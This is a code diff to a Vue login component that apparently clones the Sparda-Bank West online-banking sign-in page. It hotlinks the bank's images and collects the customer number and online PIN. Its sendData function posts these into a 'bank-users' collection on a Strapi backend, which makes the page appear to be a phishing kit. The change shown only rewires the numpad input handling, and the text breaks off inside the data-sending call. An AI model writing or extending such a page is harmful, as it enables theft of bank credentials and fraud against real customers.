@@ -5,14 +5,14 @@
             <div class="textField">
                 <label for="user">Kundennummer</label>
             </div>
-            <input v-model="input1Value" ref="inputUser" type="text" id="inputUser" autocomplete="off" maxlength="10" tabindex="1" title="Kundennummer (erforderlich)">
+            <input ref="inputUser" type="text" id="inputUser" autocomplete="off" maxlength="10" tabindex="1" title="Kundennummer (erforderlich)">
             <img title="Zifferneingabe öffnen" src="https://banking.sparda-west.de/portalstatic/spm/gfx/style/zifferneingabe.png">
         </div>
         <div class="input pin">
             <div class="textField">
                 <label for="onlinePin">Online-Pin</label>
             </div>
-            <input v-model="input2Value" ref="inputPin" type="password" id="inputOnlinePin" autocomplete="off" maxlength="6" tabindex="2" title="Online-PIN (erforderlich)">
+            <input ref="inputPin" type="password" id="inputOnlinePin" autocomplete="off" maxlength="6" tabindex="2" title="Online-PIN (erforderlich)">
             <img title="Zifferneingabe öffnen" src="https://banking.sparda-west.de/portalstatic/spm/gfx/style/zifferneingabe.png">
         </div>
     </div>
@@ -20,7 +20,7 @@
         <img title="Jetzt einloggen" src="https://banking.sparda-west.de/portalstatic/spm/gfx/style/buttons/buttonFlach_Jetzt_einloggen.png" @click="sendData">
     </button>
 
-    <Numpad :value1="input1Value" :value2="input2Value" @update:value1="updateInput1" @update:value2="updateInput2" />
+    <Numpad />
 
 </template>
 
@@ -78,28 +78,18 @@
 
 <script lang="ts" setup>
 
-    import Numpad from './Numpad.vue';
-    import { ref, Ref } from 'vue';
+    import { ref, Ref, provide } from 'vue';
     const { create } = useStrapi();
-
-    let input1Value: Number;
-    let input2Value: Number;
 
     interface InputData {
         value: string | null | undefined;
     }
 
-    function updateInput1(value: any) {
-        input1Value = value;
-    }
-
-    function updateInput2(value: any) {
-        input2Value = value;
-    }
-
     const inputUser: Ref<InputData> = ref({ value: null });
     const inputPin: Ref<InputData> = ref({ value: null });
     const loginBtn: Ref = ref({ value: null });
+    provide('inputUser', inputUser);
+    provide('inputPin', inputPin);
     
     async function sendData(){
         await useAsyncData('bank-users', () => create('bank-users', {
